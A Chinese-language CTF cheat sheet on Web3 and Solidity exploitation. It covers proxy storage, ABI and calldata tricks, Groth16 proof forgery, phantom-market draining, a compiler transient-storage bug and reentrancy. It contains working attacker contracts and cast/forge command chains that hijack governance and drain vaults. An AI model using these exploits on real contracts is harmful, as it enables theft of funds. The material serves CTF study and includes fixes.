# CTF Web - Web3 / Blockchain Challenges

## Table of Contents
- [Challenge Infrastructure Pattern](#challenge-infrastructure-pattern)
  - [Auth Implementation (Python)](#auth-implementation-python)
- [EIP-1967 Proxy Pattern Exploitation](#eip-1967-proxy-pattern-exploitation)
- [ABI Coder v1 vs v2 - Dirty Address Bypass](#abi-coder-v1-vs-v2---dirty-address-bypass)
- [Solidity CBOR Metadata Stripping for Codehash Bypass](#solidity-cbor-metadata-stripping-for-codehash-bypass)
- [Non-Standard ABI Calldata Encoding](#non-standard-abi-calldata-encoding)
- [Solidity bytes32 String Encoding](#solidity-bytes32-string-encoding)
- [Complete Exploit Flow (House of Illusions)](#complete-exploit-flow-house-of-illusions)
- [Delegatecall Storage Context Abuse (EHAX 2026)](#delegatecall-storage-context-abuse-ehax-2026)
- [Groth16 Proof Forgery for Blockchain Governance (DiceCTF 2026)](#groth16-proof-forgery-for-blockchain-governance-dicectf-2026)
- [Phantom Market Unresolve + Force-Funding (DiceCTF 2026)](#phantom-market-unresolve--force-funding-dicectf-2026)
- [Solidity Transient Storage Clearing Helper Collision (Solidity 0.8.28-0.8.33)](#solidity-transient-storage-clearing-helper-collision-solidity-0828-0833)
- [Reentrancy Attack - DAO Pattern (DefCamp 2017)](#reentrancy-attack---dao-pattern-defcamp-2017)
- [Web3 CTF Tips](#web3-ctf-tips)

---

## Challenge Infrastructure Pattern

1. **认证**：GET `/api/auth/nonce` -> 使用 `personal_sign` 签名 -> POST `/api/auth/login`
2. **创建实例**：链上调用 `factory.createInstance()`（需要测试网 ETH）
3. **利用**：与部署出的实例合约交互
4. **检查**：GET `/api/challenges/check-solution`，若 `isSolved()` 为真则返回 flag

### Auth Implementation (Python)
```python
from eth_account import Account
from eth_account.messages import encode_defunct
import requests

acct = Account.from_key(PRIVATE_KEY)
s = requests.Session()
nonce = s.get(f'{BASE}/api/auth/nonce').json()['nonce']
msg = encode_defunct(text=nonce)
sig = acct.sign_message(msg)
r = s.post(f'{BASE}/api/auth/login', json={
    'signedNonce': '0x' + sig.signature.hex(),
    'nonce': nonce,
    'account': acct.address.lower()  # Challenge-specific: this server expected lowercase
})
s.cookies.set('token', r.json()['token'])
```

**关键说明：**
- 某些 CTF 服务端要求地址必须是小写，而不是 EIP-55 checksum 格式；先看前端 JS 确认。这不是通用规则，其他题可能反而要求 checksum
- `bundle.js` 通常包含 chain ID、合约地址和认证流程细节
- 链上交互优先用 Foundry 的 `cast`：`cast call`、`cast send`、`cast storage`

---

## EIP-1967 Proxy Pattern Exploitation

**存储槽位：**
```text
Implementation: keccak256("eip1967.proxy.implementation") - 1
Admin:          keccak256("eip1967.proxy.admin") - 1
```

```bash
cast storage $PROXY 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc  # impl
cast storage $PROXY 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103  # admin
```

**关键点：** Proxy 只把调用 `delegatecall` 给实现合约，但实际存储位于 proxy 上。`delegatecall` 场景里的 `address(this)` 也是 proxy 地址。

---

## ABI Coder v1 vs v2 - Dirty Address Bypass

Solidity 0.8.x 默认使用 ABI coder v2，会校验 `address` 参数的高 12 字节必须为 0。若使用 `pragma abicoder v1`，则不会做这层校验。

**模式（House of Illusions）：**
1. 合约逻辑需要“脏地址”字节，但参数类型却声明为 `address`
2. ABI coder v2 会直接以空 revert data（`"0x"`）拒绝
3. 使用 `pragma abicoder v1` 部署同逻辑实现，生成不同字节码，不做该校验
4. 再通过 proxy 的升级功能切换实现

**识别：** 调用直接以空数据 `0x` 回退，通常就是 ABI coder v2 参数校验触发。

---

## Solidity CBOR Metadata Stripping for Codehash Bypass

某些 proxy 会先去掉 Solidity 编译器附带的 CBOR metadata，再校验 `keccak256(strippedCode) == ALLOWED_CODEHASH`。

```python
code = bytes.fromhex(bytecode[2:])
meta_len = int.from_bytes(code[-2:], 'big')
stripped = code[:len(code) - meta_len - 2]
codehash = keccak256(stripped)
```

---

## Non-Standard ABI Calldata Encoding

**重叠 calldata：** 当合约要求 `msg.data.length == 100`，但函数参数是 `(address, bytes)` 时：
```text
Standard: 4 + 32(addr) + 32(offset=0x40) + 32(len) + 32(data) = 132 bytes
Crafted:  4 + 32(dirty_addr) + 32(offset=0x20) + 32(sigil_data) = 100 bytes
```
把 offset 设为 `0x20` 后，它会同时充当 offset 指针和 `bytes` 长度字段。

---

## Solidity bytes32 String Encoding

`bytes32("0xAnan or Tensai?")` 会把 ASCII 按左对齐写入，右侧补 0：
```text
0x3078416e616e206f722054656e7361693f000000000000000000000000000000
```

---

## Complete Exploit Flow (House of Illusions)

```bash
export PATH="$PATH:/Users/lcf/.foundry/bin"
RPC="https://ethereum-sepolia-rpc.publicnode.com"

forge create src/IllusionHouse.sol:IllusionHouse --private-key $KEY --rpc-url $RPC --broadcast
cast send $PROXY "reframe(address)" $NEW_IMPL --private-key $KEY --rpc-url $RPC
cast send $PROXY $CRAFTED_CALLDATA --private-key $KEY --rpc-url $RPC
cast send $PROXY "appointCurator(address)" $MY_ADDR --private-key $KEY --rpc-url $RPC
cast call $FACTORY "isSolved(address)(bool)" $MY_ADDR --rpc-url $RPC
```

---

## Delegatecall Storage Context Abuse (EHAX 2026)

**模式（Heist v1）：** Vault 合约提供 `execute()`，内部会对治理合约做 `delegatecall`。而 `setGovernance()` **没有访问控制**。

**存储布局注意：** `delegatecall` 在调用方的存储上下文里执行被调代码。如果 vault 的布局是：
- Slot 0：`paused`（bool）+ `fee`（uint248），为打包存储
- Slot 1：`admin`（address）
- Slot 2：`governance`（address）

那么被 `delegatecall` 的合约只要写入 slot 0/1，就会直接修改 vault 的 `paused` 与 `admin`。

**攻击链：**
1. 部署一个存储布局与 vault 匹配的攻击合约
2. 调用 `setGovernance(attacker_address)`，由于无访问控制，治理地址被劫持
3. 调用 `execute(abi.encodeWithSignature("attack(address)", player))` 触发 `delegatecall`
4. 攻击合约里的 `attack()` 把 slot 0 写成 `paused=false`，slot 1 写成 `admin=player`
5. 再调用 `withdraw()`，此时以 admin 身份且 vault 未暂停，可直接取款

```solidity
contract Attacker {
    bool public paused;      // slot 0 (match vault layout)
    uint248 public fee;      // slot 0
    address public admin;    // slot 1
    address public governance; // slot 2

    function attack(address _newAdmin) public {
        paused = false;
        admin = _newAdmin;
    }
}
```

```bash
# Deploy attacker
forge create Attacker.sol:Attacker --rpc-url $RPC --private-key $KEY
# Hijack governance
cast send $VAULT "setGovernance(address)" $ATTACKER --rpc-url $RPC --private-key $KEY
# Execute delegatecall
CALLDATA=$(cast calldata "attack(address)" $PLAYER)
cast send $VAULT "execute(bytes)" $CALLDATA --rpc-url $RPC --private-key $KEY
# Drain
cast send $VAULT "withdraw()" --rpc-url $RPC --private-key $KEY
```

**关键点：** 必查 `setGovernance()`、`setImplementation()`、upgrade 相关函数是否有访问控制。无保护的治理设置器 + `delegatecall` = 完整存储控制权。

---

## Groth16 Proof Forgery for Blockchain Governance (DiceCTF 2026)

**模式（Housing Crisis）：** DAO 治理依赖 Groth16 ZK proof，但存在两个 ZK 特有漏洞：

**损坏的 trusted setup（`delta == gamma`）：** 任意 proof 都可直接伪造：
```python
from py_ecc.bn128 import G1, G2, multiply, add, neg

# When vk_delta_2 == vk_gamma_2, set:
forged_A = vk_alpha1
forged_B = vk_beta2
forged_C = neg(vk_x)  # negate the public input accumulator
# This verifies for ANY public inputs
```

**Proof 重放（未约束的 nullifier）：** DAO 从不记录已使用的 `proposalNullifierHash`。可从 setup 合约的部署交易里提取一份有效 proof，然后对每个 proposal 重放。

**在 Web3 题里应检查：**
1. 比较 `vk_delta_2` 和 `vk_gamma_2`，若相等，Groth16 直接失效
2. 检查 verifier 合约是否记录并拒绝重复使用的 proof nullifier
3. 在部署交易和初始化交易里寻找现成的有效 proof

---

## Phantom Market Unresolve + Force-Funding (DiceCTF 2026)

**模式（Housing Crisis）：** 这是一个结合 DAO 治理的预测市场题，三个漏洞串起来可以抽干市场资金。

**漏洞 1 - 幽灵市场投注：**
`bet()` 只检查 `marketResolution[market] == 0`，却不检查市场是否真的存在（没有 `market < nextMarketIndex` 判断）。因此可以对尚未创建的 market ID（超出 `nextMarketIndex`）下注。

**漏洞 2 - unresolve 后状态残留：**
当后续 `createMarket()` 终于创建到这个幽灵 market ID 时，只会写入 `marketResolution[id] = 0`。这相当于把市场“重新设为未解析”，但旧的 `totalYesBet`/`totalNoBet` 仍然保留，于是可再次套现。

**漏洞 3 - 通过 selfdestruct 强制注资：**
```solidity
// EIP-6780: selfdestruct in constructor sends ETH even to contracts without receive()
contract ForceSend {
    constructor(address payable target) payable {
        selfdestruct(target);  // Forces ETH into DAO
    }
}
// Deploy: new ForceSend{value: amount}(dao_address)
```

**抽干流程：**
1. 先向 DAO 强制注入 `2*marketBalance` wei
2. Helper1 在幽灵市场 N 上投注 1 wei 的 NO
3. DAO 通过 delegatecall proposal 投入 `2*marketBalance` 的 YES
4. 把市场解析为 NO，Helper1 提现（市场表面净额归零，但 `totalYesBet` 仍残留）
5. 当 `createMarket()` 走到 N 时，执行 `marketResolution[N]=0`，市场被“取消解析”
6. Helper2 再投注 1 wei 的 NO，重新解析为 NO，Helper2 提现得到 `1 + totalYesBet/2 = 1 + marketBalance`

**关键数学：** 赔付公式为 `helperBet + helperBet * totalYesBet / totalNoBet = 1 + 1 * 2*mBal / 2 = 1 + mBal`。市场原有 `mBal + 1`，最终支付 `1 + mBal`，余额归零。

**注意点：**
- **EVM `.call` 在余额不足时会静默失败**，DAO 的下注规模要控制到最终 payout 不超过市场余额
- **ethers.js BigInt：** 比较时必须用 `!== 0n`，不能写 `!== 0`
- **EIP-6780 selfdestruct：** 若想在同一交易内删除合约，需放在构造函数里；但单纯强制转 ETH 运行时也仍可生效

**何时检查：** 预测市场 / betting 合约里，必须测试：是否能对不存在的 market ID 下注？创建市场时是否只重置 resolution，却不清空下注总额？

---

## Solidity Transient Storage Clearing Helper Collision (Solidity 0.8.28-0.8.33)

**受影响版本：** Solidity 0.8.28 到 0.8.33，仅限 IR pipeline（启用 `--via-ir`）。0.8.34 已修复。

**根因：** IR pipeline 会为 `delete` 操作生成 Yul helper 函数。helper 名称由值类型推导，但 **没有包含存储位置**（persistent 或 transient）。如果同一编译单元里同时对同类型的 persistent 变量和 transient 变量做 `delete`，两者会生成同名 helper。谁先编译，谁就决定具体实现；另一个场景会错误复用该实现，从而使用 **错误的 opcode**（`sstore` 或 `tstore`）。

**脆弱模式：**
```solidity
contract Vulnerable {
    address public owner;                    // persistent, slot 0
    mapping(uint256 => address) public m;    // persistent
    address transient _lock;                 // transient

    function guarded() external {
        require(_lock == address(0), "locked");
        _lock = msg.sender;
        // BUG: delete _lock uses sstore (persistent) instead of tstore
        // This writes zero to slot 0, overwriting owner!
        delete _lock;
    }
}
```

**两种利用方向：**
1. **Transient `delete` 实际使用 `sstore`：** 会覆盖持久化存储（如 slot 0 的 owner / 访问控制变量），而 transient 变量本身没有被清掉，重入锁也会异常
2. **Persistent `delete` 实际使用 `tstore`：** 授权、映射等删除操作不会真正落盘，交易结束后 `tstore` 的写入直接丢失

**跨类型碰撞：** 数组 `.pop()`、`delete []` 和缩容也会按 slot 粒度调用 `uint256` clearing helper。`bool[]` 的清理就可能与 `delete uint256 transient _temp` 冲突。

**识别：**
```bash
# Compare Yul output — if storage_set_to_zero_ calls change to
# transient_storage_set_to_zero_ in 0.8.34, the contract was affected
solc --via-ir --ir Contract.sol > yul_output.txt
```

**缓解：** 把 `delete _lock` 改成 `_lock = address(0)`，直接赋 0 会走正确的 opcode 路径。

**关键点：** 该 bug 需要同时满足三个条件：使用 `--via-ir` 编译、对 transient 变量执行 `delete`、并且同一编译单元中还有相同类型的 persistent `delete`。编译器不会报警，错误的存储写入也不会 revert，只会静默破坏状态。

---

## Reentrancy Attack - DAO Pattern (DefCamp 2017)

**模式：** `withdraw()` 在更新余额前，先通过 `msg.sender.call.value(amount)()` 向外部发送 ETH。恶意合约可在 fallback / receive 中递归再次调用 `withdraw()`，在余额清零前反复取钱。

```solidity
// Vulnerable contract:
contract VulnerableBank {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint amount = balances[msg.sender];
        require(amount > 0);
        // BUG: sends ETH before updating state
        (bool success,) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;   // too late — attacker re-entered before this line
    }
}
```

```solidity
// Attacker contract:
contract Attacker {
    VulnerableBank public target;
    uint public count;

    constructor(address _target) {
        target = VulnerableBank(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    // Fallback: re-enters withdraw() while balance hasn't been zeroed yet
    receive() external payable {
        if (count < 10 && address(target).balance >= msg.value) {
            count++;
            target.withdraw();   // re-entrant call
        }
    }
}
```

```python
# Deploy and trigger via web3.py / Foundry:
# forge create Attacker --constructor-args $VULNERABLE_ADDR --rpc-url $RPC --private-key $KEY
# cast send $ATTACKER "attack()" --value 1ether --rpc-url $RPC --private-key $KEY
```

**修复模式：**
```solidity
// Option 1: Checks-Effects-Interactions (zero balance BEFORE sending)
function withdraw() public {
    uint amount = balances[msg.sender];
    require(amount > 0);
    balances[msg.sender] = 0;           // effect first
    (bool success,) = msg.sender.call{value: amount}("");
    require(success);
}

// Option 2: Use transfer() — gas-limited to 2300 (not enough for re-entry)
payable(msg.sender).transfer(amount);

// Option 3: ReentrancyGuard (OpenZeppelin)
```

**关键点：** 在状态更新前进行外部调用，会让攻击者的 fallback 在首次调用尚未完成时重入。2016 年 DAO 黑客事件就是按这个模式抽走约 6000 万美元。对外部调用前先清余额，或先加锁。

---

## Web3 CTF Tips

- **Factory pattern：** 实例通常是按玩家单独部署的合约。检查 `playerToInstance(address)` 之类映射
- **Proxy fallback：** 所有未识别调用通常都会经由 `delegatecall` 转发到实现合约
- **Upgrade functions：** 一定检查访问控制，很多题会故意留空
- **`address(this)` in delegatecall：** 永远指向 proxy，不是实现合约
- **Storage layout：** `mapping` 的存储位置是 `keccak256(abi.encode(key, slot))`
- **空 revert data（`0x`）：** 通常表示 ABI 解码器校验失败
- **Contract nonce：** 从 1 开始。nonce = 1 往往说明还没创建过子合约
- **推导子合约地址：** `keccak256(rlp.encode([parent_address, nonce]))[-20:]`
- **Foundry 工具：** `cast call`（读）、`cast send`（写）、`cast storage`（原始槽位）、`forge create`（部署）
- **Sepolia 水龙头：** Google Cloud faucet（0.05 ETH）、Alchemy、QuickNode
